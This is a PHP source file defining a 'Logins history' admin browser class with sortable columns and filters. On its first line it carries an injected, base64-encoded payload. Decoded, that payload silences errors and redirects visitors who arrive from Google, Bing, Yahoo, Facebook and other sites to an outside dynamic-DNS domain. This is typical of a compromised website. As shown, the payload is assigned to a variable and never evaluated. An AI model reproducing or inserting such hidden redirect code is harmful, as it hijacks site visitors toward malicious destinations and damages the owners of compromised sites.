<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

class browser_logins_history extends browser {

  function do_setup() {

    global $url, $auth;

    $this->table = $auth->logins_history_table;
    $this->title = "Logins history";

    $this->add_capability("sort");
                                       
    $this->add_column(array ( "field"         => "date_time"
                            , "header"        => "Date/Time"
                            , "sortable"      => true
                            , "default_order" => "DESC"
                            , "group_on_sort" => true
                            ));
    $this->add_column(array ( "field"         => "ip_address"
                            , "header"        => "IP Address"
                            , "sortable"      => true
                            , "group_on_sort" => true
                            ));
    $this->add_column(array ( "field"    => "login"
                            , "header"   => "Login"
                            , "sortable" => true
                            ));
    $this->add_column(array ( "field"    => "failed"
                            , "header"   => "Failed"
                            , "type"     => "yesno"
                            , "sortable" => true
                            ));

    $this->add_filter(array ( "name"         => "failed"
                            , "where"        => "failed = ?"
                            , "title"        => "Failed"
                            , "type"         => "yesno"
                            ));
    $this->add_filter(array ( "name"         => "ip_address"
                            , "where"        => "ip_address LIKE CONCAT(?, '%')"
                            , "title"        => "IP Address starts from"
                            ));
    $this->add_filter(array ( "name"         => "date"
                            , "where"        => "date_time LIKE CONCAT(?, '%')"
                            , "title"        => "Date"
                            , "depends_on"   => "month"
                            , "type"         => "date"
                            ));
    $this->add_filter(array ( "name"         => "month"
                            , "where"        => "date_time LIKE CONCAT(?, '%')"
                            , "title"        => "Month"
                            , "type"         => "month"
                            , "depends_on"   => "date"
                            ));
  }

}

?>